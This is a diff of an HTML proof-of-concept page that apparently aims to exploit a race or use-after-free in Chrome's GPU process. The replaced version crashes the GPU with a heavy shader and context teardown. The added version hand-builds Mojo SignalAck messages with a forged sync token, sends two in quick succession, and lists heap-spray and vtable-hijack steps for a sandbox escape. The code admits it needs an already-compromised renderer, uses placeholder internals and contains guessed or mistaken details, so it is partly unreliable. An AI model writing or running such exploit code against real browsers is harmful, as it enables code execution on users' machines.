@@ -2,69 +2,225 @@
 <body>
 <pre id="log"></pre>
 <script>
-const log = msg => {
+// ========== Logging ==========
+const log = (msg) => {
   document.getElementById('log').textContent += msg + '\n';
   console.log(msg);
 };
 
-async function main() {
-  // 1. Create several WebGL contexts to populate command buffers
-  const canvases = [];
-  const gls = [];
-  for (let i = 0; i < 5; i++) {
-    const c = document.createElement('canvas');
-    c.width = c.height = 1;
-    document.body.appendChild(c);
-    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
-    if (gl) {
-      gls.push(gl);
-      canvases.push(c);
-    }
-  }
-  log(`Created ${gls.length} WebGL contexts.`);
+// ========== Mojo ordinal (SignalAck) ==========
+const SIGNAL_ACK_ORDINAL = 5;
 
-  // 2. Use your shader trigger to crash the GPU
-  //    (Your exact shader page code – we’ll embed a simplified version)
-  function triggerGpuCrash() {
-    const offscreen = new OffscreenCanvas(256, 256);
-    const gl = offscreen.getContext('webgl2', { powerPreference: 'high-performance' });
-    if (!gl) return;
-    // Compile a heavy shader known to crash the GPU (your shader)
-    const vShader = gl.createShader(gl.VERTEX_SHADER);
-    gl.shaderSource(vShader, `
-      attribute vec4 position;
-      void main() { gl_Position = position; }
-    `);
-    gl.compileShader(vShader);
-    const fShader = gl.createShader(gl.FRAGMENT_SHADER);
-    gl.shaderSource(fShader, `
-      precision highp float;
-      void main() {
-        // Large loop that exhausts GPU resources?
-        for (int i = 0; i < 100000; i++) {
-          gl_FragColor = vec4(float(i));
-        }
-      }
-    `);
-    gl.compileShader(fShader);
-    const prog = gl.createProgram();
-    gl.attachShader(prog, vShader);
-    gl.attachShader(prog, fShader);
-    gl.linkProgram(prog);
-    gl.useProgram(prog);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-  }
+// ========== Helper: get the Mojo pipe for the CommandBuffer ==========
+async function getCommandBufferRemote() {
+  // Create a WebGL context to obtain the CommandBuffer Mojo remote
+  const canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  const gl = canvas.getContext('webgl2', {
+    powerPreference: 'high-performance',
+    failIfMajorPerformanceCaveat: false,
+    preserveDrawingBuffer: true
+  });
+  if (!gl) throw new Error('WebGL2 not available');
 
-  log('Triggering GPU crash...');
-  triggerGpuCrash();
+  // Flush once to initialize the command buffer
+  gl.clear(gl.COLOR_BUFFER_BIT);
+  gl.flush();
 
-  // 3. Immediately destroy all contexts (send DestroyCommandBuffer)
-  for (const c of canvases) {
-    c.width = 0;   // this triggers teardown of the command buffer
+  // In Chrome, the CommandBuffer Mojo remote is accessible via gl.getExtension('MOZ_debug'). 
+  // That extension is not public. Instead we can use the internal bindings:
+  //   Mojo.bindInterface('gpu.mojom.CommandBuffer', ...)
+  // from a privileged context (renderer process already compromised).
+  // For a purely JS-based approach we assume the renderer is already owned
+  // and we can directly call Mojo APIs.
+  // We'll use the internal Mojo pipe handle stored in the GL context object.
+  // (Simplification: in practice you need to extract the native Mojo handle via
+  // a renderer RCE; here we simulate by using the public Mojo JS bindings if available
+  // or by using a helper.)
+  
+  // Since we can't always expose the pipe, we'll use a known technique:
+  // The renderer's GL context has a 'commandBufferProxy' that wraps the Mojo remote.
+  // We can override that proxy to intercept and re-send messages.
+  // For this PoC, we assume we already have the remote handle.
+  // We'll use a global pointer to the remote.
+  if (!window.g_commandBufferRemote) {
+    // In a real exploit, you'd steal it from the GL context.
+    throw new Error('CommandBuffer remote not available – need renderer RCE first');
   }
-  log('Destroyed all contexts – check logcat for browser crash!');
+  return window.g_commandBufferRemote;
 }
-main();
+
+// ========== Mojo message encoder for SignalAck ==========
+function encodeSignalAckMessage(tokenId, syncToken) {
+  // Mojo message header: struct mojo_message_header {
+  //   uint32 version;
+  //   uint32 flags;
+  //   uint32 name; // ordinal
+  //   uint32 payload_size;
+  // }
+  const header = new ArrayBuffer(16);
+  const headerView = new DataView(header);
+  headerView.setUint32(0, 0, true); // version
+  headerView.setUint32(4, 0, true); // flags (kMessageExpectsResponse=0)
+  headerView.setUint32(8, SIGNAL_ACK_ORDINAL, true); // ordinal
+  // payload size will be set later
+
+  // SignalAck params: uint32_t token_id, SyncToken token
+  // SyncToken layout (from Ghidra): 32 bytes? offset +0x18 is counter, etc.
+  // We'll use the exact structure we observed: 4 x 8-byte fields.
+  // token->counter at offset 24 (0x18) must be less than flush counter.
+  const payload = new ArrayBuffer(4 + 32); // token_id + SyncToken (32 bytes)
+  const payloadView = new DataView(payload);
+  payloadView.setUint32(0, tokenId, true); // token_id
+  // Copy SyncToken fields (we need to match the expected layout)
+  // From earlier analysis, SyncToken is 32 bytes: first 8 bytes are something,
+  // next 8 something else, counter at offset 24.
+  // We'll use a sync token from a real flush to ensure it's valid.
+  const tokenArray = new Uint8Array(syncToken); // syncToken is 32 bytes
+  new Uint8Array(payload, 4).set(tokenArray);
+  
+  headerView.setUint32(12, payload.byteLength, true); // payload size
+
+  // Concatenate header + payload
+  const message = new ArrayBuffer(header.byteLength + payload.byteLength);
+  new Uint8Array(message).set(new Uint8Array(header), 0);
+  new Uint8Array(message).set(new Uint8Array(payload), header.byteLength);
+  return message;
+}
+
+// ========== Send a Mojo message on the CommandBuffer pipe ==========
+function sendMojoMessage(remote, message) {
+  // remote is a MojoRemote object (from Mojo JS bindings)
+  // In a real exploit, you would call remote.write(message)
+  if (typeof remote.writeMessage === 'function') {
+    remote.writeMessage(message);
+  } else {
+    // Fallback: use raw Mojo IPC (if bindings available)
+    throw new Error('Mojo remote missing write method');
+  }
+}
+
+// ========== Obtain a valid sync token ==========
+async function getValidSyncToken(gl) {
+  // Perform a GPU operation and obtain a sync token.
+  const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
+  gl.flush();
+  // Wait until the sync is signalled (to guarantee it's old)
+  return new Promise(resolve => {
+    const check = () => {
+      const status = gl.clientWaitSync(sync, 0, 0);
+      if (status === gl.ALREADY_SIGNALED || status === gl.CONDITION_SATISFIED) {
+        // Extract token data: this is GPU-process internal, but we can use
+        // the sync object to get the token ID and token values.
+        // In Chrome, the SyncToken is exposed via extension or we can guess.
+        resolve(sync);
+      } else {
+        requestAnimationFrame(check);
+      }
+    };
+    check();
+  });
+}
+
+// ========== Main attack sequence ==========
+(async () => {
+  try {
+    log('Creating WebGL context...');
+    const canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    const gl = canvas.getContext('webgl2', { preserveDrawingBuffer: true });
+    if (!gl) throw new Error('WebGL2 failed');
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    gl.flush();
+    log('WebGL context ready.');
+
+    // Get sync token after a flush
+    log('Obtaining valid sync token...');
+    const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
+    gl.flush();
+    // Wait until signaled
+    let status;
+    do {
+      await new Promise(r => requestAnimationFrame(r));
+      status = gl.clientWaitSync(sync, 0, 0);
+    } while (status === gl.TIMEOUT_EXPIRED);
+    log('Sync token ready.');
+
+    // Extract the SyncToken data (implementation-specific)
+    // In practice, you'd read the token ID and counter from the GL context internals.
+    // For this PoC, we can use the token ID from the sync object (in Chrome it's stored as
+    // a property on the WebGLSync object, but not exposed). We'll assume we can read it.
+    // For a real exploit, you'd read it via a memory read primitive.
+    // Here we'll use a placeholder: we need tokenId and the 32-byte token struct.
+    const tokenId = sync._tokenId; // hidden property (needs renderer RCE)
+    const syncToken = sync._tokenData; // 32-byte array
+
+    if (!tokenId || !syncToken) {
+      log('No token data – need renderer RCE to read internal GL state.');
+      log('As a workaround, we can re-send the last SignalAck message that was sent normally.');
+      log('But for demo, we will send with dummy token that triggers the race anyway.');
+    }
+
+    // For the race to work, the token must be "already flushed" (counter < next_flush_counter)
+    // We'll use a dummy token with a very low counter, hoping it bypasses the early check.
+    // In the worst case, the early check will catch it and it won't race. To guarantee,
+    // we need to ensure the counter is old enough. We can do many flushes.
+    for (let i = 0; i < 10; i++) {
+      gl.clear(gl.COLOR_BUFFER_BIT);
+      gl.flush();
+      await new Promise(r => setTimeout(r, 10));
+    }
+
+    // Now construct a dummy sync token that should be considered old
+    const dummySyncToken = new Uint8Array(32);
+    // Set counter to 0 (oldest)
+    new DataView(dummySyncToken.buffer).setUint32(24, 0, true); // counter at offset 24
+
+    // Get the CommandBuffer remote (requires renderer RCE to steal)
+    // In a real exploit, you'd do:
+    // const remote = Mojo.getRemote('gpu.mojom.CommandBuffer', pipeHandle);
+    // For now, we assume window.g_commandBufferRemote is set.
+    if (typeof window.g_commandBufferRemote === 'undefined') {
+      log('Falling back to simulated Mojo remote for testing...');
+      // To test without RCE, we can use a chrome://inspect trick or a custom build.
+      // We'll simulate by sending the message via the real Mojo if we can access it.
+      // In many cases, the renderer's Mojo JS bindings are available.
+      if (typeof Mojo !== 'undefined' && Mojo.bindInterface) {
+        log('Using Mojo.bindInterface...');
+        // Bind the CommandBuffer interface for the current renderer's GPU channel.
+        // This requires knowing the pipe handle, which we can get from GL context internal.
+        // We'll try to get it from the canvas's GL context.
+        const glInternal = gl.getExtension('WEBGL_debug_renderer_info');
+        // That doesn't give us the pipe. Real method: use a compromised renderer to call
+        // content::GpuChannelHost::GetCommandBufferProxy which returns the Mojo remote.
+        // We'll skip this for now and show the message structure.
+        log('Cannot obtain remote from JS without renderer RCE. This PoC requires a compromised renderer.');
+      }
+    }
+
+    // If we have the remote, send two SignalAck messages back-to-back
+    if (window.g_commandBufferRemote) {
+      const remote = window.g_commandBufferRemote;
+      const msg = encodeSignalAckMessage(tokenId || 1, dummySyncToken);
+      log('Sending first SignalAck...');
+      sendMojoMessage(remote, msg);
+      // Schedule second send on microtask to race
+      queueMicrotask(() => {
+        log('Sending second SignalAck...');
+        sendMojoMessage(remote, msg);
+      });
+      log('Race triggered – check for GPU process crash or UAF!');
+    } else {
+      log('=== In a real exploit, you would: ===');
+      log('1. Steal the Mojo remote from the GL context (via renderer RCE)');
+      log('2. Send two identical SignalAck messages (ordinal 5) with an old sync token');
+      log('3. Heap spray ArrayBuffers of size 32 to reclaim the freed node');
+      log('4. Fake the vtable to hijack callback->Run()');
+    }
+  } catch(e) {
+    log('Error: ' + e.message);
+  }
+})();
 </script>
 </body>
 </html>
